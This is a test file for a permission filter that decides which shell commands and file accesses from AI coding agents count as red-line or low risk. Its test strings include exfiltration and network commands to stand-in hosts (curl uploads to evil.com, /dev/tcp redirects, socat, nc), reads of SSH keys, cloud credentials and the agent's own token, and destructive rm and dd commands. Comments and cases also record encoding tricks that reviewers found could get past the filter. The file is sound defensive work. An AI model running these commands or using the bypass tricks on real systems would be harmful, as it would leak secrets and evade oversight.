import { describe, it, expect } from 'vitest'
import { floorReason, isLowRisk, pathsUnder, toolClass } from './floor'
import type { PermissionAsk } from '../../domain/permission-rules/types'

const HOME = '/Users/me'
const ask = (over: Partial<PermissionAsk> = {}): PermissionAsk => ({
  surface: 'workbench', provider: 'claude', tool: 'Bash', command: 'ls', cwd: '/w', project: '/w',
  isolatedWorktree: true, tier: 'admin', scope: 't1', ...over,
})
const sh = (command: string, over: Partial<PermissionAsk> = {}) => ask({ tool: 'Bash', command, ...over })
const edit = (paths: string[], over: Partial<PermissionAsk> = {}) => ask({ tool: 'Edit', command: undefined, paths, ...over })

describe('toolClass', () => {
  it('classifies the tools the executors send', () => {
    expect(toolClass('Read')).toBe('read')
    expect(toolClass('Grep')).toBe('read')
    expect(toolClass('Edit')).toBe('write')
    expect(toolClass('fileChange')).toBe('write')
    expect(toolClass('edit')).toBe('write')
    expect(toolClass('Bash')).toBe('shell')
    expect(toolClass('commandExecution')).toBe('shell')
    expect(toolClass('execute')).toBe('shell')
    expect(toolClass('mcp:github:create_issue')).toBe('other')
    expect(toolClass('WebFetch')).toBe('other')
  })
})

describe('pathsUnder', () => {
  it('resolves .. and respects separator boundaries', () => {
    expect(pathsUnder(['/w/a', '/w/b/c'], '/w')).toBe(true)
    expect(pathsUnder(['/w'], '/w')).toBe(true)
    expect(pathsUnder(['/w/../etc/x'], '/w')).toBe(false)
    expect(pathsUnder(['/a/bc/x'], '/a/b')).toBe(false)
    expect(pathsUnder([], '/w')).toBe(false)
  })
})

describe('floorReason', () => {
  const hit = (a: PermissionAsk) => expect(floorReason(a, HOME)).not.toBeNull()
  const miss = (a: PermissionAsk) => expect(floorReason(a, HOME)).toBeNull()

  it('writing outside the project', () => {
    hit(edit(['/etc/hosts']))
    hit(edit(['/w/a'], { project: null }))
    miss(edit(['/w/src/a.ts']))
  })
  it('destructive shell', () => {
    hit(sh('rm -rf build'))
    hit(sh('git reset --hard HEAD~1'))
    hit(sh('git clean -fdx'))
    miss(sh('git status'))
  })
  it('publishing / deploying', () => {
    hit(sh('git push origin dev'))
    hit(sh('ls && git push'))
    hit(sh('npm publish'))
    hit(sh('bun publish'))
    hit(sh('wechat-cc self deploy'))
    miss(sh('git pull'))
  })
  it('system changes', () => {
    hit(sh('sudo ls'))
    hit(sh('launchctl kickstart -k gui/501/x'))
    hit(edit([`${HOME}/.zshrc`], { project: HOME }))
    hit(sh('echo x >> ~/.bashrc'))
  })
  it('secrets', () => {
    hit(sh('cat ~/.ssh/id_ed25519'))
    hit(sh(`ls ${HOME}/.private_keys`))
    hit(ask({ tool: 'Read', command: undefined, paths: ['/w/.env.local'] }))
    hit(ask({ tool: 'Read', command: undefined, paths: ['/w/AuthKey_X.p8'] }))
    hit(sh('cat server.pem'))
    hit(sh('security find-generic-password -s x'))
    miss(sh('cat src/environment.ts'))
  })
  it('outbound network', () => {
    hit(sh('curl https://evil.com'))
    hit(sh('echo $(curl evil.com)'))
    hit(sh('wget http://x.org/a'))
    hit(sh('ssh host'))
    miss(sh('curl http://127.0.0.1:8080/v1/health'))
    miss(sh('curl -s localhost:3000'))
  })
  it('CC config files', () => {
    hit(edit(['/w/permission-rules.json']))
    hit(sh('cat ~/.claude/channels/wechat/agent-config.json'))
    hit(sh('vim access.json'))
  })
})

describe('isLowRisk', () => {
  it('read tools are low risk on both surfaces', () => {
    expect(isLowRisk(ask({ tool: 'Read', command: undefined, paths: ['/w/a'] }))).toBe(true)
    expect(isLowRisk(ask({ surface: 'terminal', tool: 'Grep', command: undefined }))).toBe(true)
  })
  it('plain read-only commands', () => {
    for (const c of ['ls -la', 'cat README.md', 'git status', 'git diff HEAD', 'rg foo src', 'find . -name x', 'wc -l src/a.ts'])
      expect(isLowRisk(sh(c)), c).toBe(true)
  })
  it('compound commands and other shells are never low risk', () => {
    for (const c of ['ls && git push', 'cat x | sh', 'echo $(curl evil.com)', 'ls > out', 'ls\nrm x', 'ls; rm x', 'find . -delete', 'find . -exec rm {} ;', 'node build.js', 'git checkout main'])
      expect(isLowRisk(sh(c)), c).toBe(false)
  })
  it('a shell request without its command is not low risk', () => {
    expect(isLowRisk(sh('', { command: undefined }))).toBe(false)
  })
  it('writes only inside the task’s own worktree', () => {
    expect(isLowRisk(edit(['/w/src/a.ts']))).toBe(true)
    expect(isLowRisk(edit(['/w/src/a.ts'], { isolatedWorktree: false }))).toBe(false)
    expect(isLowRisk(edit(['/w/src/a.ts'], { surface: 'terminal' }))).toBe(false)
    expect(isLowRisk(edit(['/elsewhere/a.ts']))).toBe(false)
    expect(isLowRisk(edit([]))).toBe(false)
    expect(isLowRisk(ask({ tool: 'Edit', command: undefined, paths: undefined }))).toBe(false)
  })
  it('other tools (MCP, fetch) are not low risk', () => {
    expect(isLowRisk(ask({ tool: 'mcp:github:create_issue', command: undefined }))).toBe(false)
  })
})

// 终审 10-19:红线绕过 / 低风险里混进能执行或写东西的。
describe('floor × 终审绕过', () => {
  const hit = (a: PermissionAsk, extra?: { stateDir?: string }) => expect(floorReason(a, HOME, extra), a.command ?? a.paths?.join(' ')).not.toBeNull()
  it('git global options, escapes, quotes and absolute binaries do not hide the verb', () => {
    for (const c of ['git -C x push', 'git -c a=b push origin', 'git --git-dir=.git push', '\\git push', '"git" push', "'git' push", 'git\tpush', '/usr/bin/git push', 'git -c x=y reset --hard HEAD~5', 'git --no-pager clean -fd', '/usr/bin/sudo ls', 'doas ls', 'env sudo ls', 'command git push', 'gh pr merge 3'])
      hit(sh(c))
  })
  // 2026-10 变异基线:按词判的 rm / dd 那半截(segs.some(...))整个换成 false 没有一条测试红 —— 上面的用例都先被
  // isDestructiveBash 的正则接住了。这里只放正则接不住、只能靠按词判的写法;`/bin/dd if=/dev/zero of=…` 当时真漏了
  // (参数被取了 basename,`of=/dev/disk2` 变成 `disk2`)。
  it('rm / dd behind an absolute path, an escape, quotes or xargs are still destructive', () => {
    for (const c of ['/bin/rm -rf build', '\\rm -rf build', '"rm" -rf build', "'rm' -r build", 'find . -name x | xargs rm', '/bin/dd if=/dev/zero of=/dev/disk2', '\\dd of=/dev/disk2 if=/dev/zero'])
      expect(floorReason(sh(c), HOME), c).toBe('破坏性命令')
  })
  it('.git internals are a red line for writes', () => {
    hit(edit(['/w/.git/hooks/pre-commit']))
    hit(edit(['/w/.git/config']))
  })
  it('wider secrets', () => {
    for (const p of [`${HOME}/.aws/credentials`, `${HOME}/.netrc`, `${HOME}/.npmrc`, `${HOME}/.config/gh/hosts.yml`, `${HOME}/.docker/config.json`, '/w/.envrc', '/w/keys/id_rsa', `${HOME}/.git-credentials`, `${HOME}/.kube/config`, `${HOME}/.gnupg/x`])
      hit(ask({ tool: 'Read', command: undefined, paths: [p] }))
  })
  it("CC's whole state directory", () => {
    const stateDir = `${HOME}/.claude/channels/wechat`
    hit(ask({ tool: 'Read', command: undefined, paths: [`${stateDir}/internal-operator-token`] }), { stateDir })
    hit(sh(`cat ${stateDir}/daemon.env`), { stateDir })
    hit(sh('cat ~/.claude/channels/wechat/mailbox-key.json'), { stateDir })
  })
  it('a project at the home directory gives no inside-project treatment', () => {
    hit(edit([`${HOME}/Library/LaunchAgents/x.plist`], { project: HOME }))
  })
})

// 2026-10 变异基线:词表(SYSTEM_WORDS / NET_WORDS / publishes)大多只测了一两个,从表里删掉任何一个都不红。
// 这里每个词一条字面命令、断言具体理由 —— 删掉一个词,那条命令要么落到别的理由、要么不再是红线,都会红。
// 正则(isDestructiveBash)先接得住的写法(`git reset --hard`、`git branch -D`)改用 `git -C repo …`,
// 让它只能靠按词判的那张表接住。
describe('floor 词表:每个词都是红线', () => {
  const reason = (c: string) => floorReason(sh(c), HOME)
  it('推送 / 发布 / 部署', () => {
    const table = [
      'git push origin dev',
      'git clean -fdx',
      'git -C repo reset --hard HEAD~1',
      'git -C repo branch -D feat',
      'git filter-branch --tree-filter x HEAD',
      'git update-ref -d refs/heads/feat',
      'npm publish',
      'pnpm publish --no-git-checks',
      'yarn publish',
      'bun publish',
      'cargo publish',
      'gh release create v1.0.0',
      'gh pr merge 3 --squash',
      'gh repo delete owner/repo --yes',
      'wechat-cc self deploy',
      'wechat-cc self change "x"',
    ]
    for (const c of table) expect(reason(c), c).toBe('推送 / 发布 / 部署')
  })
  it('多词的动作要每个词都在:只出现前半截不算', () => {
    for (const c of ['git reset HEAD~1', 'git -C repo branch -a', 'git update-ref refs/heads/x HEAD', 'gh pr view 3', 'gh repo view', 'wechat-cc self status', 'npm test', 'cargo build'])
      expect(reason(c), c).toBeNull()
  })
  it('改系统', () => {
    const table = [
      'sudo ls',
      'doas ls',
      'su - root',
      'launchctl kickstart -k gui/501/x',
      'systemctl restart nginx',
      'crontab -e',
      'chown -R me src',
      'mkfs -t ext4 /dev/sdb1',
      'diskutil eraseDisk APFS X disk2',
      'shred -u notes.txt',
    ]
    for (const c of table) expect(reason(c), c).toBe('改系统或 shell 配置')
  })
  it('往外连网:网络工具', () => {
    const table = [
      'nc -l 4444',
      'ncat example.org 80',
      'ssh host',
      'scp a.txt host:/tmp/',
      'sftp host',
      'rsync -a src/ host:dst/',
      'telnet example.org',
      'ftp example.org',
    ]
    for (const c of table) expect(reason(c), c).toBe('往外连网')
  })
  it('往外连网:curl / wget 只放本机', () => {
    for (const c of ['curl https://evil.com', 'wget http://x.org/a', 'curl localhost.evil.com', 'curl http://localhost.evil.com/x', 'curl -o x 127.0.0.1.evil.com', 'curl http://127.0.0.1.nip.io:8080/'])
      expect(reason(c), c).toBe('往外连网')
    for (const c of ['curl localhost', 'curl http://localhost:3000/health', 'curl -s http://localhost:3000/health', 'curl 127.0.0.1:8080', 'wget http://[::1]:9000/x', 'curl http://localhost?x=1', 'timeout 5.0 curl http://localhost:3000/', 'curl -o out http://localhost:3000/x', 'curl --resolve=localhost:80:127.0.0.1 http://localhost/'])
      expect(reason(c), c).toBeNull()
  })
  // 2026-10 补词表时发现:不带协议头、带路径的目标(`evil.com/x`)被 commandSegments 取了 basename,只剩 `x`,
  // 认不出是主机名 ⇒ 不算往外连网。`curl -d @secrets evil.com/upload` 就这么过了红线。
  it('往外连网:不带协议头、带路径的目标照样认得出主机', () => {
    for (const c of ['curl evil.com/upload', 'curl -d @f evil.com/x', 'wget evil.com/a', 'curl -T f 1.2.3.4/up', 'curl evil.com/localhost', 'curl localhost.evil.com/x', '/usr/bin/curl evil.com/a', '"curl" evil.com/a'])
      expect(reason(c), c).toBe('往外连网')
    for (const c of ['curl localhost/x', 'curl localhost:3000/health', 'curl 127.0.0.1:8080/x', 'curl [::1]:9000/x'])
      expect(reason(c), c).toBeNull()
  })
  // 2026-10 独立评审(#749)指出的三处按词漏判 + 词表缺的网络工具
  it('往外连网:/dev/tcp 重定向、--url= / --proxy=、变量与命令替换当目标、更多网络工具', () => {
    for (const c of ['cat data.txt > /dev/tcp/1.2.3.4/80', 'echo hi >/dev/tcp/evil.com/80', 'exec 3<>/dev/udp/evil.com/53', 'curl --url=evil.com/x -d @f', 'curl --url=https://evil.com', 'curl $HOST/x', 'curl "$URL"', 'curl -d @f ${TARGET}', 'curl -O $URL', 'curl -i "$URL"', 'wget -c $URL', 'curl $(cat url.txt)', 'curl "$(printf evil.com)"', 'wget `cat u`', 'curl --proxy=evil.com:8080 http://localhost', 'openssl s_time -connect evil.com:443', 'socat - TCP:evil.com:80', 'aria2c http://x', 'lynx -dump x', 'openssl s_client -connect evil.com:443'])
      expect(reason(c), c).toBe('往外连网')
    for (const c of ['curl --url=http://localhost:3000/x', 'curl -o $OUT http://localhost:3000/x', 'wget -O $FILE localhost/x', 'curl -d "$BODY" http://localhost:3000/x', 'curl localhost:$PORT/health', 'curl http://localhost:${PORT}/', 'curl -X $METHOD localhost:3000', 'curl -sSLo "$OUT" http://localhost:3000/x', 'echo $(date) > out.txt', 'curl --resolve=localhost:80:127.0.0.1 http://localhost/', 'openssl rand -hex 16'])
      expect(reason(c), c).toBeNull()
  })
  // #750 留下的口子:不带点 / 冒号的裸主机名(`curl intranet/up`)。按网络工具自己的参数语法判:
  // 不是选项值的位置参数就是网址(curl 把 `intranet/up` 当 http://intranet/up);`-o out` 的 out 是选项值、是文件。
  it('往外连网:裸主机名按 curl / wget 的参数语法认(位置参数 = 网址,选项值 = 文件)', () => {
    const table = [
      'curl intranet/up', 'curl intranet', 'wget host/x', 'curl -o out intranet/x', 'curl -O $URL', 'curl -sSo out intranet',
      'curl -sSoout intranet', 'curl -fsSL intranet/install.sh', 'curl --url=intranet/x', 'curl --url intranet', 'curl --output out intranet',
      'wget -qO- intranet/x', 'wget --output-document=out intranet', 'curl -- intranet', 'curl -s localhost:3000/health intranet',
      'curl http://localhost/ $URL', 'curl -d @body.json intranet/upload', 'curl -T f intranet', 'timeout 5 curl intranet',
      // 值本身是主机的选项:代理 / socks / doh;-K / wget -i:网址写在文件里,看不见 ⇒ 当外面
      'curl -x intranet http://localhost/', 'curl -sx intranet http://localhost/', 'curl --socks5 intranet http://localhost/', 'curl --doh-url intranet http://localhost/',
      'curl -K cfg', 'curl --config cfg localhost:3000', 'wget -i urls.txt', 'wget --input-file=- ', 'wget -e https_proxy=intranet http://localhost/',
      // --resolve 把本机名解析到外面的地址
      'curl --resolve=localhost:80:10.0.0.5 http://localhost/', 'curl --resolve localhost:80:intranet http://localhost/',
      // 目标从标准输入来;引号里的 ; 不是 shell 分隔符
      'cat urls | xargs curl', 'xargs -n1 wget < urls', 'find . -name u -exec curl {} ;', 'curl -d "x;" intranet/up', 'curl -H "a|b" intranet',
      // 把 curl 当程序跑的「读命令」不算数据:rg --pre、git 的 pager / alias
      'rg --pre curl x intranet', 'git -c core.pager="sh -c curl intranet" log',
      // 引号里的 > 不是重定向,后面的词照样是网址
      'curl ">" intranet/up', "curl '<' intranet", 'curl \\> intranet',
    ]
    for (const c of table) expect(reason(c), c).toBe('往外连网')
    const ok = [
      'curl localhost:3000/health', 'curl -o out http://localhost/x', 'cat out', 'ls intranet', 'curl -sSo out localhost:3000/x',
      'curl --max-time 5 http://localhost:3000/', 'curl -m 5 -X POST localhost:3000/x', 'curl -w %{http_code} -o /dev/null -s localhost:3000',
      'wget -q -O - http://localhost/x', 'wget -t 3 -T 10 localhost:8080/x', 'curl -x localhost:8080 http://localhost/', 'curl --resolve=localhost:443:[::1] https://localhost/',
      'curl --unix-socket sock http://localhost/x', 'grep -rn curl src', 'rg curl src/adapters', 'brew install curl wget', 'which curl', 'man curl',
      'curl -A agent -e ref localhost:3000',
      // shell 重定向的目标是文件,不是网址
      'curl -s localhost:3000/x > out', 'curl -s localhost:3000/x 2>/dev/null', 'curl localhost:3000 >> log 2>&1', 'curl -d @- localhost:3000/x < body',
    ]
    for (const c of ok) expect(reason(c), c).toBeNull()
  })
  // #761 独立评审找到的绕过(都用 bun 脚本对 floor.ts 复现过)
  it('往外连网:评审 #761 —— 重定向里的 &、空引号参数、会执行的「读命令」、wget 长选项缩写', () => {
    const table = [
      // 重定向里的 & 不是后台符(改之前带点的主机也漏);续行 \ + CRLF
      'curl -s 2>&1 evil.com/x', 'curl -s &>/dev/null evil.com/x', 'wget -q >&2 evil.com', 'curl 2>&1 intranet/up', 'curl -s &>>log intranet', 'curl -s \\\r\n intranet/up',
      // 空引号参数是一个词:选项吃掉的是它,不是后面的网址
      'curl -d "" intranet/up', "curl -H '' intranet", 'curl -A "" intranet/x', 'wget --post-data "" intranet/x',
      // 能执行别的程序的「读命令」
      'brew bundle exec -- curl intranet/up', "ag --pager 'curl intranet/up'", "ack --pager 'curl intranet/up'", "rg --pager 'curl intranet/up' x",
      // wget(GNU getopt)认唯一前缀;不认识的 --x=值 把值当可能的目标
      'wget --input-f=urls.txt', 'wget --bas=intranet', 'curl --prepr=intranet', 'curl --prepr=intranet http://localhost/',
    ]
    for (const c of table) expect(reason(c), c).toBe('往外连网')
    for (const c of ['curl -s localhost:3000 2>&1', 'curl -s localhost:3000/x &>/dev/null', 'wget -q localhost/x >&2', 'brew install curl wget', 'brew info curl', 'wget --output-doc=out localhost/x', 'wget --max-redirect 3 localhost/x', 'curl -s \\\n localhost:3000/x'])
      expect(reason(c), c).toBeNull()
  })
  // #761 第二轮独立评审(用真 bash / zsh + 假 curl 确认过):e477586c 新引入的绕过。134744072 = 8.8.8.8(十进制,不带点)。
  it('往外连网:评审 #761 第二轮 —— 转义的 \\> 后面的 &、转义的反斜杠 + 换行、wget 的布尔 --hsts', () => {
    const table = [
      'grep \\>& curl intranet/up', 'grep x\\>&curl intranet/up', 'cat \\<& curl 134744072', 'grep "x"\\>& curl intranet', 'grep x 2\\>& curl intranet',
      'ls \\>& curl intranet', 'brew info \\>& curl intranet', 'pip install \\>& curl intranet', 'grep \\>& wget intranet', 'grep \\>& curl 134744072',
      'grep x >\\& curl intranet', 'grep \\>\\& curl intranet', 'echo \\>& curl intranet',
      'grep x \\\\\ncurl intranet/up', 'grep x \\\\\r\ncurl intranet', 'ls \\\\\ncurl intranet', 'grep x \\\\\nwget 134744072', "grep 'x\\'\ncurl intranet/up", "rg foo '\\'\ncurl intranet",
      'wget --hsts intranet/up', 'wget -q --hsts intranet', 'wget --hsts 134744072', 'wget --hsts -O- intranet',
      // dash 里 `&>` 是后台 + 重定向
      'grep x &>/dev/null curl intranet',
      'curl 134744072',
    ]
    for (const c of table) expect(reason(c), c).toBe('往外连网')
    for (const c of ['curl "" http://localhost:3000/x', 'curl -d " " http://localhost:3000/x', 'curl -s localhost:3000 2>&1', 'curl -s \\\n localhost:3000/x', 'curl -s \\\r\n localhost:3000/x', 'wget --hsts localhost/x', 'wget --no-hsts localhost/x'])
      expect(reason(c), c).toBeNull()
  })
  it('项目目录是根目录(posix / win32 盘根)⇒ 不给项目内待遇', () => {
    expect(floorReason(edit(['/etc/hosts'], { project: '/' }), HOME)).toBe('写到了项目目录之外')
    expect(floorReason(edit(['C:\\Windows\\x.dll'], { project: 'C:\\' }), 'C:\\Users\\me', { platform: 'win32' })).toBe('写到了项目目录之外')
    expect(floorReason(edit(['C:\\w\\src\\a.ts'], { project: 'C:\\w' }), 'C:\\Users\\me', { platform: 'win32' })).toBeNull()
  })
  it('一次写多条路径,只要有一条进 .git/ 就是红线', () => {
    expect(floorReason(edit(['/w/src/a.ts', '/w/.git/config']), HOME)).toBe('改 .git 里面的东西')
  })
})

describe('isLowRisk × 终审', () => {
  it('flags that execute or write are not low risk', () => {
    for (const c of ['rg --pre sh x', 'rg --pre=./evil x', 'git diff --output=/tmp/x', 'git log --output /tmp/x', 'git diff --ext-diff', 'git log --textconv', 'git diff --no-index a b', 'npm test', 'bun run test', 'pnpm run lint', 'yarn test', 'git -c core.pager=sh log'])
      expect(isLowRisk(sh(c)), c).toBe(false)
  })
  it('reads: paths must be inside the project; pathless only for cwd-scoped search tools', () => {
    expect(isLowRisk(ask({ tool: 'Read', command: undefined, paths: [`${HOME}/.aws/x`] }))).toBe(false)
    expect(isLowRisk(ask({ tool: 'Read', command: undefined, paths: ['/w/src/a.ts'] }))).toBe(true)
    expect(isLowRisk(ask({ tool: 'Grep', command: undefined }))).toBe(true)
    expect(isLowRisk(ask({ tool: 'read', command: undefined }))).toBe(false)
    expect(isLowRisk(ask({ tool: 'Read', command: undefined }))).toBe(false)
  })
})
